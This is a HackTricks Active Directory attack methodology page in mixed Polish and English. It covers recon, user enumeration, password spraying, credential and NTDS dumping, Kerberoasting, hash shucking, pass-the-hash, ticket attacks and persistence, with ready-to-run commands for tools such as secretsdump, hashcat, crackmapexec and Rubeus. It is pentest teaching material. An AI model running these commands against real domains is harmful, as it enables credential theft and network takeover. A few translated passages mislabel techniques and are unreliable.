# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** pełni rolę podstawowej technologii, umożliwiając administratorom sieci efektywne tworzenie i zarządzanie **domenami**, **użytkownikami** oraz **obiektami** w obrębie sieci. Została zaprojektowana z myślą o skalowalności, ułatwiając organizację dużej liczby użytkowników w zarządzalne **grupy** i **podgrupy**, jednocześnie kontrolując **prawa dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domen**, **drzew** i **lasów**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** czy **urządzenia**, korzystających ze wspólnej bazy danych. **Drzewa** to grupy tych domen powiązane wspólną strukturą, a **las** reprezentuje zbiór wielu drzew połączonych poprzez **relacje zaufania**, tworząc najwyższą warstwę struktury organizacyjnej. Konkretne **prawa dostępu** i **komunikacji** mogą być wyznaczane na każdym z tych poziomów.

Kluczowe pojęcia w **Active Directory** obejmują:

1. **Directory** – Zawiera wszystkie informacje dotyczące obiektów Active Directory.
2. **Object** – Oznacza byty w katalogu, w tym **użytkowników**, **grupy** czy **udzielone foldery**.
3. **Domain** – Służy jako kontener dla obiektów katalogu; w **lesie** może istnieć wiele domen, z których każda utrzymuje własny zbiór obiektów.
4. **Tree** – Grupa domen, które dzielą wspólną domenę root.
5. **Forest** – Szczytowa struktura organizacyjna w Active Directory, złożona z kilku drzew z **relacjami zaufania** między nimi.

**Active Directory Domain Services (AD DS)** obejmuje zestaw usług kluczowych dla scentralizowanego zarządzania i komunikacji w sieci. Usługi te obejmują:

1. **Domain Services** – Centralizuje przechowywanie danych i zarządza interakcjami między **użytkownikami** a **domenami**, w tym **uwierzytelnianiem** i funkcjami **wyszukiwania**.
2. **Certificate Services** – Nadzoruje tworzenie, dystrybucję i zarządzanie bezpiecznymi **certyfikatami cyfrowymi**.
3. **Lightweight Directory Services** – Wspiera aplikacje wykorzystujące katalog poprzez protokół **LDAP**.
4. **Directory Federation Services** – Zapewnia możliwości **single-sign-on** do uwierzytelniania użytkowników w wielu aplikacjach webowych w jednej sesji.
5. **Rights Management** – Pomaga chronić materiały objęte prawami autorskimi, regulując ich nieautoryzowaną dystrybucję i użycie.
6. **DNS Service** – Kluczowy dla rozwiązywania **nazw domen**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Aby nauczyć się, jak **atakować AD**, musisz bardzo dobrze **zrozumieć** proces uwierzytelniania **Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Możesz zajrzeć na [https://wadcoms.github.io/](https://wadcoms.github.io) aby szybko zobaczyć, które polecenia możesz uruchomić, aby enumerować/eksploitować AD.

> [!WARNING]
> Komunikacja Kerberos **wymaga pełnej nazwy kwalifikowanej (FQDN)** do wykonywania akcji. Jeśli spróbujesz uzyskać dostęp do maszyny po adresie IP, **użyje NTLM, a nie Kerberos**.

## Recon Active Directory (Brak poświadczeń/sesji)

Jeśli masz dostęp do środowiska AD, ale nie posiadasz żadnych poświadczeń/sesji, możesz:

- **Przeprowadzić pentest sieci:**
- Skanuj sieć, znajdź maszyny i otwarte porty oraz spróbuj **eksploitować luki** lub **wyciągnąć poświadczenia** z nich (na przykład, [drukarki mogą być bardzo ciekawymi celami](ad-information-in-printers.md)).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak web, drukarki, udziały, vpn, media itp.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Zajrzyj do ogólnej [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby znaleźć więcej informacji o tym, jak to zrobić.
- **Sprawdź dostęp null i Guest na usługach smb** (to nie zadziała na nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy przewodnik dotyczący enumeracji serwera SMB znajduje się tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumeruj Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy przewodnik dotyczący enumeracji LDAP można znaleźć tutaj (zwróć **szczególną uwagę na anonimowy dostęp**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatruj sieć**
- Zbieraj poświadczenia, **podszywając się pod usługi za pomocą Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskaj dostęp do hosta poprzez [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbieraj poświadczenia, **eksponując** [**fałszywe usługi UPnP za pomocą evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyciągaj nazwy użytkowników/imiona z dokumentów wewnętrznych, mediów społecznościowych, usług (głównie web) wewnątrz środowisk domeny oraz z zasobów publicznie dostępnych.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz spróbować różnych konwencji tworzenia nazw użytkowników w AD (**read this** (https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęstsze konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery z każdego), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonimowa SMB/LDAP enum:** Sprawdź strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) oraz [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Gdy żądany jest **nieprawidłowy username**, serwer odpowie kodem błędu **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala nam określić, że nazwa użytkownika jest nieprawidłowa. **Prawidłowe nazwy użytkowników** wywołają albo **TGT w odpowiedzi AS-REP**, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi wykonać pre-autentykację.
- **No Authentication against MS-NRPC**: Użycie auth-level = 1 (Brak uwierzytelnienia) przeciwko interfejsowi MS-NRPC (Netlogon) na kontrolerach domen. Metoda wywołuje funkcję `DsrGetDcNameEx2` po związaniu interfejsu MS-NRPC, aby sprawdzić, czy użytkownik lub komputer istnieje bez żadnych poświadczeń. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten typ enumeracji. Badania można znaleźć [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Jeśli znajdziesz jeden z tych serwerów w sieci, możesz również przeprowadzić **user enumeration** przeciwko niemu. Na przykład możesz użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Możesz znaleźć listy nazw użytkowników w [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  i w tym ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak powinieneś mieć **imiona i nazwiska osób pracujących w firmie** z etapu recon, który powinieneś wykonać wcześniej. Mając imię i nazwisko możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) do wygenerowania potencjalnych poprawnych nazw użytkowników.

### Knowing one or several usernames

Ok, więc wiesz że masz już poprawną nazwę użytkownika, ale nie masz haseł... Spróbuj wtedy:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_ możesz **zażądać wiadomości AS_REP** dla tego użytkownika, która będzie zawierać dane zaszyfrowane pochodną hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbuj najczęściej używanych **common passwords** dla każdego z odkrytych użytkowników — może ktoś używa słabego hasła (pamiętaj o polityce haseł!).
- Zwróć uwagę, że możesz też **spray OWA servers**, aby spróbować uzyskać dostęp do serwerów poczty użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie **uzyskać** pewne challenge **hashes** do złamania przez **poisoning** niektórych protokołów w **sieci**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Jeśli udało Ci się zenumerować Active Directory, będziesz mieć **więcej emaili i lepsze zrozumienie sieci**. Możesz być w stanie wymusić NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack), aby uzyskać dostęp do środowiska AD.

### Steal NTLM Creds

Jeśli możesz **uzyskać dostęp do innych PC lub udziałów** przy użyciu użytkownika **null or guest**, możesz **umieścić pliki** (np. plik SCF), które jeśli zostaną w jakiś sposób otwarte spowodują, że **wywołane zostanie uwierzytelnienie NTLM przeciwko Tobie**, dzięki czemu możesz **ukraść** **NTLM challenge**, by go złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** traktuje każdy posiadany NT hash jako kandydat hasła dla innych, wolniejszych formatów, których materiał klucza jest wyprowadzany bezpośrednio z NT hasha. Zamiast brute-forcing długich passphrase'ów w Kerberos RC4 tickets, NetNTLM challenges czy cached credentials, wprowadzasz NT hashe do trybów NT-candidate w Hashcat i pozwalasz mu zweryfikować ponowne użycie hasła bez poznawania plaintextu. Jest to szczególnie skuteczne po kompromitacji domeny, gdy możesz zebrać tysiące aktualnych i historycznych NT hashy.

Użyj shucking gdy:

- Masz korpus NT z DCSync, zrzutów SAM/SECURITY lub z credential vaults i potrzebujesz przetestować ponowne użycie w innych domenach/lasach.
- Przechwytujesz Kerberos material oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses lub DCC/DCC2 blobsy.
- Chcesz szybko udowodnić ponowne użycie dla długich, niełamalnych passphrase'ów i natychmiast pivotować przez Pass-the-Hash.

Technika **nie działa** przeciwko typom szyfrowania, których klucze nie są NT hashem (np. Kerberos etype 17/18 AES). Jeśli domena wymusza tylko AES, musisz wrócić do zwykłych trybów password.

#### Building an NT hash corpus

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby zebrać jak największy zbiór NT hashy (i ich poprzednich wartości):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Wpisy historii dramatycznie rozszerzają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy na konto. Po więcej sposobów na zebranie sekretów NTDS patrz:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wydobywa lokalne dane SAM/SECURITY i cached domain logons (DCC/DCC2). Unikaj duplikatów i dopisz te hashe do tego samego pliku `nt_candidates.txt`.
- **Track metadata** – Zachowaj nazwę użytkownika/domenę, która wygenerowała każdy hash (nawet jeśli wordlist zawiera tylko hex). Pasujące hashe od razu wskazują, który principal ponownie używa hasła, gdy Hashcat wypisze zwycięską kandydaturę.
- Preferuj kandydatów z tego samego lasu lub z zaufanego lasu; to maksymalizuje szansę na pokrycie przy shuckingu.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Jeśli udało ci się zenumerować Active Directory, będziesz mieć **więcej e‑maili i lepsze zrozumienie sieci**. Możesz być w stanie wymusić NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Teraz, gdy masz podstawowe poświadczenia, powinieneś sprawdzić, czy możesz **znaleźć** jakieś **interesujące pliki udostępnione w AD**. Możesz to robić ręcznie, ale to bardzo nudne, powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Zobacz narzędzia, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Jeśli możesz **access other PCs or shares** możesz **place files** (like a SCF file), które jeśli w jakiś sposób zostaną otwarte spowodują t**rigger an NTLM authentication against you**, dzięki czemu możesz **steal** **the NTLM challenge** i je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta podatność pozwalała każdemu uwierzytelnionemu użytkownikowi na **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Do poniższych technik zwykły użytkownik domenowy nie wystarczy — potrzebujesz specjalnych uprawnień/poświadczeń, aby przeprowadzić te ataki.**

### Hash extraction

Miejmy nadzieję, że udało Ci się **compromise some local admin** account przy użyciu [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (w tym relaying), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Następnie czas zrzucić wszystkie hashe z pamięci i lokalnie.\
[**Przeczytaj tę stronę o różnych sposobach pozyskania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, możesz go użyć, aby się nim **impersonate**.\
Musisz użyć jakiegoś **tool**, który **perform** **NTLM authentication using** tego **hash**, **or** możesz utworzyć nowy **sessionlogon** i **inject** ten **hash** do **LSASS**, tak aby kiedy zostanie wykonana jakakolwiek **NTLM authentication is performed**, ten **hash will be used.** Ostatnia opcja to to, co robi mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ten atak ma na celu **use the user NTLM hash to request Kerberos tickets**, jako alternatywa dla powszechnego Pass The Hash przez protokół NTLM. W związku z tym może być szczególnie **useful in networks where NTLM protocol is disabled** i gdy jedynym dozwolonym protokołem uwierzytelniania jest **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** napastnicy **steal a user's authentication ticket** zamiast ich hasła lub wartości hash. Ten skradziony ticket jest następnie używany do **impersonate the user**, uzyskując nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Jeśli masz **hash** lub **password** of a **local administrato**r powinieneś spróbować **login locally** na innych **PCs** używając go.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Należy zauważyć, że jest to dość **hałaśliwe**, a **LAPS** może to **złagodzić**.

### Nadużycia MSSQL i zaufane linki

Jeśli użytkownik ma uprawnienia do **dostępu do instancji MSSQL**, może użyć ich do **wykonywania poleceń** na hoście MSSQL (jeśli działa jako SA), **wykradzenia** NetNTLM **hash** lub nawet przeprowadzenia **relay attack**.\
Również, jeśli instancja MSSQL jest zaufana (database link) przez inną instancję MSSQL. Jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **wykorzystać relację zaufania do wykonywania zapytań również w drugiej instancji**. Te zaufania mogą być łańcuchowane i w pewnym momencie użytkownik może znaleźć błędnie skonfigurowaną bazę danych, na której może wykonywać polecenia.\
**Połączenia między bazami danych działają nawet przez zaufania między lasami.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Nadużycia platform inwentaryzacji i deploymentu IT

Narzędzia firm trzecich do inwentaryzacji i wdrażania często odsłaniają potężne ścieżki do poświadczeń i wykonania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeżeli znajdziesz obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucić TGTs z pamięci wszystkich użytkowników, którzy logują się na ten komputer.\
Zatem, jeśli **Domain Admin logins onto the computer**, będziesz w stanie zrzucić jego TGT i podszyć się pod niego używając [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie przejąć serwer wydruku** (oby był to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeżeli użytkownik lub komputer ma przyznane uprawnienie "Constrained Delegation", będzie mógł **podszyć się pod dowolnego użytkownika, aby uzyskać dostęp do niektórych usług na komputerze**.\
Następnie, jeśli **skomprujesz hash** tego użytkownika/komputera, będziesz w stanie **podszyć się pod dowolnego użytkownika** (nawet Domain Admins) aby uzyskać dostęp do usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** na obiekcie Active Directory zdalnego komputera umożliwia uzyskanie wykonania kodu z **podniesionymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Nadużycia uprawnień / ACLs

Skompromitowany użytkownik może mieć pewne **interesujące uprawnienia do niektórych obiektów domeny**, które mogłyby pozwolić na **ruch lateralny**/**eskalację** uprawnień.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Nadużycie usługi Printer Spooler

Odkrycie nasłuchującej w domenie **usługi Spool** może być **nadużyte** do **zdobycia nowych poświadczeń** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Nadużycia sesji osób trzecich

Jeśli **inni użytkownicy** **uzyskują dostęp** do **skompro- mitowanego** komputera, możliwe jest **zbieranie poświadczeń z pamięci** i nawet **wstrzyknięcie beaconów do ich procesów** w celu podszycia się pod nich.\
Zazwyczaj użytkownicy łączą się z systemem przez RDP, więc poniżej znajdziesz, jak wykonać kilka ataków na sesjach RDP osób trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

LAPS zapewnia system zarządzania **lokalnym hasłem Administratora** na komputerach dołączonych do domeny, zapewniając, że jest ono **losowe**, unikalne i często **zmieniane**. Te hasła są przechowywane w Active Directory, a dostęp kontrolowany jest przez ACL do uprawnionych użytkowników. Mając wystarczające uprawnienia do dostępu do tych haseł, możliwe jest pivoting na inne komputery.


{{#ref}}
laps.md
{{#endref}}

### Kradzież certyfikatów

**Zbieranie certyfikatów** ze skompromitowanego komputera może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Nadużycie szablonów certyfikatów

Jeśli skonfigurowano **podatne szablony**, możliwe jest ich nadużycie w celu eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploatacja z kontem o wysokich uprawnieniach

### Zrzucanie poświadczeń domeny

Gdy zdobędziesz uprawnienia **Domain Admin** lub jeszcze lepiej **Enterprise Admin**, możesz **zrzucić** **bazę domeny**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Niektóre z wcześniej omówionych technik mogą być użyte do utrzymania dostępu.\
Na przykład możesz:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Uczynić użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Przyznać uprawnienia [**DCSync**](#dcsync) użytkownikowi

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Atak **Silver Ticket** tworzy **prawidłowy Ticket Granting Service (TGS) ticket** dla konkretnej usługi, używając **NTLM hash** (na przykład, **hash konta PC**). Ta metoda jest stosowana do **uzyskania uprawnień do usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Atak **Golden Ticket** polega na uzyskaniu przez atakującego dostępu do **NTLM hash konta krbtgt** w środowisku Active Directory (AD). To konto jest specjalne, ponieważ jest używane do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, które są niezbędne do uwierzytelniania w sieci AD.

Gdy atakujący zdobędzie ten hash, może tworzyć **TGTs** dla dowolnego konta, które wybierze (atak Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są to bilety podobne do golden tickets sfałszowane w sposób, który **omija typowe mechanizmy wykrywania golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posiadanie certyfikatów konta lub możliwość ich wystawienia** to bardzo dobry sposób na utrzymanie dostępu do konta użytkownika (nawet jeśli zmieni hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

